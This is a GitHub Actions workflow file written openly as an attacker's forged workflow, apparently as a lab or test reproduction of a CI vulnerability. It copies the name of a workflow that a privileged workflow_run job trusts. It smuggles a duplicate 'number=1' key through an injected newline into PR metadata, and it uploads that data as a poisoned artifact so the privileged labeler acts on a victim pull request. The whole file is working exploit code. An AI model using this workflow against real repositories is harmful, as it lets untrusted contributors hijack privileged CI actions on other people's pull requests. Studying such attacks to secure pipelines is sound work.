# FORGED: same workflow name as the one the privileged workflow_run watches.
# Runs on the attacker's PR branch with a read-only token, but its name makes
# the privileged "PR Label Apply" workflow fire on the default branch.
name: PR Label Analysis

on:
  pull_request:
    types: [opened]

permissions:
  contents: read

jobs:
  analyze:
    name: Analyze PR for labeling
    runs-on: ubuntu-latest
    steps:
      - name: Forged PR metadata (attacker controlled)
        run: |
          mkdir -p ./pr-metadata
          # The victim PR we want the privileged labeler to touch is #1.
          # Line 1 is the "real" run's PR number; the injected duplicate key
          # overwrites the step output because $GITHUB_OUTPUT keeps the last value.
          printf '2\nnumber=1\n' > ./pr-metadata/pr-number.txt
          cat ./pr-metadata/pr-number.txt
      - name: Upload forged metadata
        uses: actions/upload-artifact@v4
        with:
          name: pr-metadata-2
          path: pr-metadata/
          retention-days: 1
